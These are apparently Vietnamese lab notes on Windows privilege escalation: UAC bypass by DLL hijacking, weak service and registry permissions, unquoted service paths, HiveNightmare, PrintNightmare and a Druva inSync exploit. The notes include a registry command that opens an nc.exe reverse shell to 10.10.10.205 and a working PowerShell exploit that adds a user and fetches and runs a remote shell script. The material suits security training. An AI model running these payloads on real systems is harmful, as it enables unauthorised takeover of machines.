# User Account Control
User Account Control là một tính năng cho phép hiển thị lời nhắc đồng ý đối với các hoạt động yêu cầu quyền nâng cao. Các ứng dụng có các mức độ toàn vẹn khác nhau, và một chương trình có mức độ cao có thể thực hiện các tác vụ có khả năng làm tổn hại hệ thống. Khi UAC được bật, các ứng dụng và tác vụ luôn chạy trong ngữ cảnh bảo mật của tài khoản không quản trị viên, trừ khi quản trị viên tường minh cấp quyền truy cập cấp quản trị cho các ứng dụng/ tác vụ này để chạy. Đây là một tính năng tiện ích giúp bảo vệ quản trị viên khỏi các thay đổi không mong muốn, nhưng không được coi là một ranh giới bảo mật.
Khi UAC được triển khai, người dùng có thể đăng nhập vào hệ thống bằng tài khoản người dùng tiêu chuẩn của họ. Khi các tiến trình khởi chạy bằng token người dùng tiêu chuẩn, ta có thể thực hiện các tác vụ bằng các quyền để chạy, UAC có tiêu chuẩn. Một ứng dụng yêu cầu thêm quyền để chạy, và UAC có thể cung cấp thêm quyền truy cập cho token để chúng chạy chính xác.
Có 10 cài đặt Group Policy có thể được cấu hình cho UAC. Bảng dưới đaya cung cấp thêm chi tiết:

| Group Policy Setting                                                                                                    | Registry Key                | Default Setting                                                     |
| ----------------------------------------------------------------------------------------------------------------------- | --------------------------- | ------------------------------------------------------------------- |
| User Account Control: Chế độ Phê duyệt của Quản trị viên (Admin Approval Mode) cho tài khoản quản trị viên tích hợp sẵn | FilterAdministratorToken    | Disabled                                                            |
| User Account Control: Cho phép ứng dụng UIAccess nhắc nhở nâng cao mà không sử dụng màn hình bảo mật                    | EnableUIADesktopToggle      | Disabled                                                            |
| User Account Control: Hành vi của lời nhắc nâng cao đối với quản trị viên trong chế độ phê duyệt của quản trị viên      | ConsentPromptBehaviorAdmin  | Nhắc đồng ý đối với các tệp nhị phân không phải của Windows         |
| User Account Control: Hành vi của lời nhắc nâng cao đối với người dùng tiêu chuẩn                                       | ConsentPromptBehaviorUser   | Nhắc nhập thông tin xác thực trên màn hình bảo mật                  |
| User Account Control: Phát hiện cài đặt ứng dụng và nhắc nhở nâng cao                                                   | EnableInstalledDetection    | Enable (mặc định cho gia đình)/ Disable (mặc định cho doanh nghiệp) |
| User Account Control: Chỉ nâng cao các tệp thực thi đã được đăng ký và xác thực                                         | ValidateAdminCodeSignatures | Disabled                                                            |
| User Account Control: Chỉ nâng cao các ứng dụng UIAccess nằm trong các vị trí bảo mật                                   | EnableSecureUIAPaths        | Enable                                                              |
| User Account Control: Chạy tất cả quản trị viên trong chế độ phê duyệt quản trị viên                                    | EnableLUA                   | Enable                                                              |
| User Account Control: Chuyển sang màn hình bảo mật khi nhắc nhở nâng cao                                                | PromptOnSecureDesktop       | Enable                                                              |
| User Account Control: Ảo hoá các lỗi ghi tệp và registry sang vị trí người dùng                                         | EnableVirtualization        | Enable                                                              |
Tài khoản quản trị viên mặc định RID 500 luôn hoạt động ở mức bắt buộc cao (high mandatory level). Khi chế độ phê duyệt quản trị viên (Admin Approval Mode - AAM) được bật, bất kỳ tài khoản quản trị mới nào được tạo sẽ hoạt động ở mức bắt buộc trung bình (medium mandatory level) theo mặc định và sẽ được cấp hai token truy cập riêng biệt (Separate access tokens) khi đăng nhập. rong ví dụ dưới đây, tài khoản người dùng **sarah** thuộc nhóm quản trị viên, nhưng `cmd.exe` hiện đang chạy trong ngữ cảnh token truy cập không có đặc quyền (unprivileged access token).
Đầu tiên mình kiểm tra người dùng hiện tại bằng command `whoami /user`![[Screenshot 2026-08-16 at 02.15.54.png|center|border|650]]Từ kết quả trên ta có thể thấy phần Relative Identifier (RID) của user sarah đang là `1002` có nghĩa là đây là tài khoản người dùng thông thường.Tiếp theo mình xác minh xem user có thuộc nhóm quản trị viên không bằng lệnh `net localgroup Administrators`![[Screenshot 2026-08-16 at 02.19.24.png|center|border|650]]Nhìn vào output ta có thể thấy `sarah` thuộc nhóm Administrators, và xác minh được rằng user `sarah` là tài khoản có quyền quản trị nhưng đang chạy ở mức độ bắt buộc trung bình do UAC (Admin Approval Mode). Tiếp theo mình xem xét đặc quyền người dùng bằng command `whoami /priv`![[Screenshot 2026-08-16 at 02.22.24.png|center|border|650]]Từ output cho thấy sarah tuy thuộc nhóm quản trị nhưng token hiện tại không có đặc quyền do UAC Admin Approval Mode đang được bật, mình sẽ xác minh UAC AAM đang được bật bằng cách sử dụng cmd `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`:![[Screenshot 2026-08-16 at 02.26.46.png|center|border|650]]`EnableLUA` (LUA - Least User Access: nguyên tắc bảo mật yêu cầu người dùng chỉ có quyền tối thiểu cần thiết để thực hiện tác vụ). `EnableLUA` là cài đặt tổng thể, nó cho biết UAC được bật hay không, UAC tắt khi giá trị. của nó là `0x0`, ngược lại UAC bật khi giá trị của nó `0x1`. Từ output mình đã xác nhận UAC bật, cần kiểm tra UAC level:![[Screenshot 2026-08-16 at 02.32.03.png|center|border|650]]Giá trị của `ConsentPromptBehaviorAdmin` là `0x5`, có nghĩa là mức độ UAC cao nhất luôn thông báo đang được bật. Các kỹ thuật UAC khai thác các lỗ hổng hoặc chức năng không mong muốn trong các bản Windows khác nhau. Bây giờ mình kiểm tra bản dựng Windows mà ta đang tìm cách leo thang:![[Screenshot 2026-08-16 at 02.35.53.png|center|border|650]]Output này trả về số bản dựng 14393, mà sử dụng trang này chúng ta có thể đối chiếu với bản phát hành Windows 1607.![[Attacking the OS.png|center|border|650]]Project [UACME](https://github.com/hfiref0x/UACME) duy trì danh sách các kỹ thuật bypass UAC, bao gồm thông tin về số bản dựng Windows bị ảnh hưởng, kỹ thuật được sử dụng, và liệu Microsoft đã phát hành bản cập nhật bảo mật để khắc phục hay chưa. Hãy sử dụng kỹ thuật số 54, được cho là hoạt động từ bản dựng Windows 10 14393. Kỹ thuật này nhắm mục tiêu phiên bản 32-bit của tệp nhị phân tự động nâng cao đặc quyền (auto-elevating binary) `SystemPropertiesAdvanced.exe`. Có nhiều tệp nhị phân đáng tin cậy (trusted binaries) mà Windows sẽ cho phép tự động nâng cao đặc quyền mà không cần lời nhắc đồng ý UAC.
Bây giờ mình kiểm tra biến môi trường bằng lệnh `cmd /c echo %PATH%` để tìm các thư mục WindowsApps nằm trong hồ sơ người dùng và có thể ghi được bởi người dùng:![[Screenshot 2026-08-16 at 02.41.32.png|center|border|650]]Chúng ta có thể bypass UAC bằng cách sử dụng kỹ thuật DLL Hijacking bằng cách đặt một DLL độc hại `srrstr.dll` vào thư mục WindowsApps, và nó sẽ được tải trong ngữ cảnh có đặc quyền cao.  Trước tiên mình tạo một DLL để thực thi reverse shell kèm khởi động http server bằng python:![[Screenshot 2026-08-16 at 02.46.04.png|center|border|650]]Sau đó mình thực hiện tải DLL xuống máy victim và thiết lập netcat trên máy attcker:![[Screenshot 2026-08-16 at 02.48.43.png|center|border]]
![[Screenshot 2026-08-16 at 02.49.54.png|center|border|650]]Cuối cùng mình chạy file DLL bằng `rundll32.exe` để kiểm tra xem có shell trả về không:![[Screenshot 2026-08-16 at 02.52.43.png|center|border|650]]Khi chúng ta nhận được kết nối trả về, chúng ta sẽ thấy quyền người dùng thông thường.![[Screenshot 2026-08-16 at 02.53.37.png|center|border|650]]Trước khi tiếp tục, chúng ta nên đảm bảo rằng mọi phiên bản tiến trình rundll32 từ lần thực thi trước đã được kết thúc:
![[Screenshot 2026-08-16 at 02.58.58.png|center|border|650]]Bây giờ, chúng ta có thể thử phiên bản 32-bit của SystemPropertiesAdvanced.exe từ máy đích.![[Screenshot 2026-08-16 at 03.02.26.png|center|border|650]]
![[Screenshot 2026-08-16 at 03.01.58.png|center|border|650]]
# WeekPermissions
Quyền truy cập trên các hệ thống Windows rất phức tạp, và khó cấu hình chính xác. Một sửa đổi nhỏ ở một nơi có thể tạo ra lỗ hổng ở nơi khác. Các lỗ hổng liên quan đến quyền truy cập được đề cập tương đối ít gặp trong các ứng dụng phần mềm của các nhà cung cấp lớn nhưng lại phổ biến trong phần mềm mã nguồn mở, và các ứng dụng tuỳ chỉnh. Các dịch vụ thường được cài đặt với quyền `SYSTEM` vì vậy việc khai thác lỗ hổng liên quan đến quyền truy cập dịch vụ thường dẫn đến việc kiểm soát hoàn toàn hệ thống. 
## Permissive File System ACLs
Mình có thể sử dụng `SharpUp` từ bộ công cụ GhostPack để kiểm tra các tệp nhj phân bị ảnh hưởng bởi ACL yếu.
![[Screenshot 2026-08-16 at 20.45.48.png|center|border|650]]Công cụ xác định dịch vụ PC Security Management Service thực thi tệp tệp nhị phân `SecurityService.exe` khi được khởi động.
Tiếp theo, mình sử dụng `icacls` để kiểm tra quyền truy cập
![[Screenshot 2026-08-16 at 20.49.41.png|center|border|650]]Từ output ta có thể xác minh lỗ hổng và thấy rằng các nhóm `EVERYONE` và `BUILTIN\Users` đã được cấp quyền đầy đủ đối với thư mục, và do đó bất kỳ người dùng hệ thống không có đặc quyền nào cũng có thể thao túng thư mục và nội dung của nó.
Dịch vụ này cũng thể được khởi động bởi người dùng không có đặc quyền vì vậy ta có thể sao lưu tệp nhị phân gốc và thay thế nó bằng một tệp nhị phân độc hại được tạo bởi `msfvenom`. Điều này có thể cung cấp cho chúng ta một reverse shell với quyền `SYSTEM`:![[Screenshot 2026-08-16 at 20.57.22.png|center|border|650]]![[Screenshot 2026-08-16 at 20.59.17.png|center|border|650]]![[Screenshot 2026-08-16 at 21.06.43.png|center|border|650]]Như vậy chúng ta đã thực hiện leo thang đặc quyền thành công.
Tiếp theo kiểm tra lại đầu ra của `SharpUp` để tìm các dịch vụ có thể sửa đổi được:
![[Screenshot 2026-08-16 at 21.16.31.png|Center|border|650]]
Từ output có thể thấy `WindsribeService` có khả năng bị cấu hình sai. Mình tiếp tục sử dụng `AccessChk` để liệt kê các quyền trên dịch vụ:
>Lưu ý: Các flag ta sử dụng:
>- `q` bỏ qua banner
>- `u` ẩn lỗi
>- `v` chi tiết
>- `c` chỉ định tên của một dịch vụ trên Windows
>- `w` chỉ hiển thị các đối tượng có quyền ghi

![[Screenshot 2026-08-16 at 21.20.22.png|center|border|650]]Ở đây kết quả cho thấy tất cả Authenticated Users đều có quyền `SERVICE_ALL_ACCESS` đối với dịch vụ. Sau đó mình thực hiện kiểm tra nhóm quản trị cụ bộ để kiểm tra xem `htb-student` có thuộc thành viên của Administrator không:![[Screenshot 2026-08-16 at 21.22.29.png|center|border|650]]Tiếp theo chúng ta sử dụng quyền của mình để thay đổi đường dẫn tệp nhị phân một cách có chủ đích, thay đổi nó để thêm người dùng hiện tại vào nhóm Admin, ta có thể đặt đường dẫn tệp nhị phân để chạy bất kỳ lệnh hoặc tệp thực thi nào mà chúng ta chọn:![[Screenshot 2026-08-16 at 21.26.24.png|center|border|650]]Vì chúng ta có toàn quyền kiểm soát dịch vụ, chúng ta có thể khởi động lại nó, và lệnh chúng ta đặt trong binpath sẽ chạy mặc dù có thông báo lỗi được trả về. Dịch vụ không khởi động được vì binpath không trỏ đến tệp thực thi dịch vụ thực sự. Tuy nhiên, tệp thực thi sẽ chạy khi hệ thống cố gắng khởi động dịch vụ trước khi báo lỗi và dừng dịch vụ lại, thực thi bất kỳ lệnh nào chúng ta chỉ định trong binpath![[Screenshot 2026-08-16 at 21.30.22.png|center|border|650]]
## Weak Service Permissions - Cleanup
Chúng ta dọn dẹp sau khi hoàn thành và đảm bảo dịch vụ hoạt động bình thường bằng cách dừng nó và đặt lại đường dẫn tệp nhị phân về tệp thực thi dịch vụ gốc và khởi động lại dịch vụ:![[Screenshot 2026-08-16 at 21.55.00.png|center|border|650]]Sau đó mình truy vấn dịch vụ để kiểm tra xem nó chạy không:![[Screenshot 2026-08-16 at 21.56.13.png|center|border|650]]
## Unquoted Service Path
Khi một dịch vụ được cài đặt, cấu hình registry chỉ định một đường dẫn đến tệp nhị phân sẽ được thực thi khi khởi động dịch vụ. Nếu tệp nhị phân này không được đặt trong dấu ngoặc kép, Windows sẽ cố gắng xác định vị trí tệp nhị phân trong các thư mục khác nhau. 
Windows sẽ quyết định phương thức thực thi của một chương trình dựa trên phần mở rộng tệp của nó, vì vậy không cần thiết phải chỉ định nó. Windows sẽ cố gắng tải tệp thực thi tiềm năng sau theo thứ tự khi khởi động dịch vụ, với `.exe` được ngầm hiểu:

```plain
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
![[Screenshot 2026-08-16 at 22.08.38.png|center|border|650]]
Nếu chúng ta có thể tạo các tệp sau, chúng ta sẽ có thể chiếm đoạt tệp nhị phân dịch vụ và đạt được thực thi lệnh trong ngữ cảnh của dịch vụ, trong trường hợp này là `NT AUTHORITY\SYSTEM`.
Chúng ta có thể xác định các đường dẫn tệp nhị phân dịch vụ không có dấu ngoặc kép bằng lệnh dưới đây.
![[Screenshot 2026-08-16 at 22.10.36.png|Center|border|650]]
## Permissive Registry ACLs
Cũng đáng để tìm kiếm các ACL dịch vụ yếu trong Windows Registry. Chúng ta có thể làm điều này bằng cách sử dụng accesschk.
![[Screenshot 2026-08-16 at 22.12.23.png|center|border|650]]
Chúng ta có thể lạm dụng điều này bằng cách sử dụng cmdlet PowerShell `Set-ItemProperty` để thay đổi giá trị ImagePath, sử dụng một lệnh như:

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

Chúng ta có thể sử dụng **WMIC** để xem chương trình nào chạy khi khởi động hệ thống. Giả sử chúng ta có quyền ghi đối với registry cho một tệp nhị phân nhất định hoặc có thể ghi đè một tệp nhị phân được liệt kê. Trong trường hợp đó, chúng ta có thể leo thang đặc quyền lên người dùng khác vào lần tiếp theo người dùng đó đăng nhập.![[Screenshot 2026-08-16 at 22.16.56.png|center|border|650]]
# Kernel Exploits
Việc đảm bảo tất cả các máy chủ đều được cập nhật là một thử thách lớn, và việc đạt được tuân thủ 100% các bản vá bảo mật cho tất cả các máy tính có lẽ là một mục tiêu không thể đạt được. 
## Lab
Đầu tiên, chúng ta có thể kiểm tra quyền truy cập tệp SAM bằng cách sử dụng `icacls`:![[Screenshot 2026-08-17 at 04.16.24.png|center|border|650]]Từ kết quả ta thấy Tệp SAM có chứa `BUILTIN\Users: (I)(RX)`, nghĩa là người dùng thường có quyền Read và Execute đối với tệp, điều này không bình thường. Việc khai thác thành công cũng yêu cầu sự hiện diện của một hoặc nhiều shadow copies. Hầu hết các hệ thống Windows 10 sẽ có SystemProtection được bật theo mặc định điều này sẽ tạo các bản sao định kỳ bao gồm cả bản sao bóng cần thiết kế để lợi dụng lỗ hổng này.
[PoC](https://github.com/GossiTheDog/HiveNightmare) này có thể được sử dụng để thực hiện tấn công, tạo các bản sao của các tệp hive registry được đề cập ở trên.
![[Screenshot 2026-08-17 at 04.22.00.png|center|border|650]]Sau đó mình lấy hash của Administrators và sử dụng `impacket-psexec` để remote vào machines với quyền admin bằng mật khẩu hash:![[Screenshot 2026-08-17 at 04.25.07.png|center|border|650]]Ngoài ra chúng ta có thể kiểm tra dịch vụ Spooler có đang chạy không:![[Screenshot 2026-08-17 at 04.30.38.png|center|border|650]]Tiếp theo, bắt đầu bằng cách vượt qua chính sách thực thi trên máy victim:![[Screenshot 2026-08-17 at 04.33.16.png|center|border|650]]
>PowerShell mặc định không cho phép chạy script `SetExecutionPolicy Bypass -Scope Process` tạm thời vô hiệu hoá hạn chế này chỉ trong phiên làm việc hiện tại.

Bây giờ chúng ta có thể import module PowerShell và sử dụng nó để thêm một người dùng quản trị viên mới:
![[Screenshot 2026-08-17 at 04.37.47.png|center|border|650]]
> Giải thích các bước:
>  1. Tạo payload DLL độc hại là `nightmare.dll`
>  2. Sử dụng đường dẫn driver máy in hợp lệ `mxdwdrv.dll`để bypass kiểm tra
>  3. Khai thác lỗ hổng RpcAddPrinterDriver để thêm người dùng vào nhóm Administrator.
>  4. Xoá payload để doạn dẹp dấu vết.

![[Screenshot 2026-08-17 at 04.40.40.png|center|border|650]]Chúng ta có thể kiểm tra các bản cập nhật đã cài đặt theo nhiều cách. Dưới đây là ba lệnh riêng biệt chúng ta có thể sử dụng.
![[Screenshot 2026-08-17 at 04.41.55.png|Center|border|650]]
![[Screenshot 2026-08-17 at 04.42.30.png|center|border|650]]![[Screenshot 2026-08-17 at 04.42.51.png|center|border|650]]
Chúng ta có thể tìm kiếm từng KB (số ID Cơ sở Tri thức Microsoft) trong Microsoft Update Catalog để có ý tưởng tốt hơn về các bản sửa lỗi nào đã được cài đặt và hệ thống có thể tụt hậu bao xa về bản cập nhật bảo mật. Tìm kiếm KB5000808 cho chúng ta thấy đây là một bản cập nhật từ tháng 3 năm 2021, có nghĩa là hệ thống có khả năng đã tụt hậu rất xa về bản cập nhật bảo mật.
# Vulnerable Services
Chúng ta có thể leo thang đặc quyền trên các hệ thống được vá đầy đủ và cấu hình chặt chẽ nếu người dùng được phép cài đặt phần mềm hoặc các ứng dụng/ dịch vụ của bên thứ ba dính các lỗ hổng được sử trong toàn bộ tổ chức. Chúng ta sẽ xem xét một trường hợp dịch vụ dễ bị tổn thương mà chúng ta có thể gặp. Một dịch vụ/ ứng dụng có thể cho phép chúng ta leo thang lên quyền `SYSTEM`. Ngược lại một số khác có thể gây ra tình trạng DoS hoặc cho phép truy cập dữ liệu nhạy cảm như các tệp cấu hình chứa mật khẩu.
Đầu tiên, mình bắt đầu bằng cách liệt kê các ứng dụng đã cài đặt ![[Screenshot 2026-08-17 at 04.58.02.png|center|border|650]]Kết quả cho ra phần lớn là tiêu chuẩn cho một máy trạm Windows 10. Tuy nhiên có ứng dụng `Druva inSync` nổi bật. Mình tìm kiếm trên Google cho thấy phiên bản `6.6.3` có lỗ hổng là command injection thông qua một dịch RPC bị lộ. Chúng ta có thể khai thác bằng [PoC](https://www.exploit-db.com/exploits/49211) để leo thang đặc quyền. Từ [blog](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) chúng ta có thể thấy rằng `Druva inSync` là một ứng dụng được sử dụng cho "Sao lưu tích hợp, eDiscovery và giám sát tuấn thủ", và ứng dụng khách chạy một dịch vụ trong context là tài khoản `NT AUTHORITY\SYSTEM`. Việc leo thang đặc quyền là có thể bằng cách tương tác với một dịch vụ đang chạy cục bộ trên cổng 6064.
Tiếp theo mình thực hiện liệt kê các cổng đang chạy:![[Screenshot 2026-08-17 at 05.04.09.png|center|border|650]]Mình tiếp tục kiểm tra tiến trình đang chạy trên port 6064 bằng PID của nó:
![[Screenshot 2026-08-17 at 05.05.57.png|center|border|650]]Kết quả tiến trình `inSyncCPHwnet64` đang chạy với PID là 3504 và lắng nghe trên cổng 6064.
Tại thời điểm này, chúng ta đã có đủ thông tin để xác định rằng ứng dụng Druva inSync đã được cài đặt và đang chạy, nhưng chúng ta có thể thực hiện thêm một kiểm tra cuối cùng bằng cách sử dụng cmdlet `Get-Service`.![[Screenshot 2026-08-17 at 05.07.27.png|center|border|650]]Kết quả: Dịch vụ inSyncCPHService (tên hiển thị: Druva inSync Client Service) đang ở trạng thái Running.
## Druva inSync Windows Client Local Privilege Escalation Example
###  Druva inSync PowerShell PoC
Với thông tin này trong tay, mình khai thác với đoạn code dưới đây:
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
![[Screenshot 2026-08-17 at 05.13.36.png|center|border|650]]Với mục đích của chúng ta, chúng ta muốn sửa đổi biến `$cmd` thành lệnh mong muốn. Chúng ta có thể làm nhiều việc ở đây, chẳng hạn như thêm một người dùng quản trị viên cục bộ.
![[Screenshot 2026-08-17 at 05.19.36.png|center|border|650]]
![[Screenshot 2026-08-17 at 05.19.58.png|center|border|650]]
### Code
```powershell
$ErrorActionPreference = "Stop"

# ===== SỬA DÒNG NÀY =====
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"


$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```